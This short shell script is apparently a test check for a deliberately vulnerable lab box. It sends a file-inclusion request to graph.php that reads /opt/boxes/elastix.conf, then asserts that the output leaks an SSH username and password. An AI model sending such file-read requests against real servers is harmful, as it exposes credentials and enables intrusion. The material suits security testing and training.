set -eu
out=$(curl -fsS "http://${BOX_HOST}:8081/${BOX_PATH}/graph.php?file=/opt/boxes/elastix.conf")
echo "$out"
echo "$out" | grep -q "SSH_USER=$BOX_U" || { echo "leaked user missing" >&2; exit 1; }
echo "$out" | grep -q "SSH_PASS=$BOX_P" || { echo "leaked password missing" >&2; exit 1; }
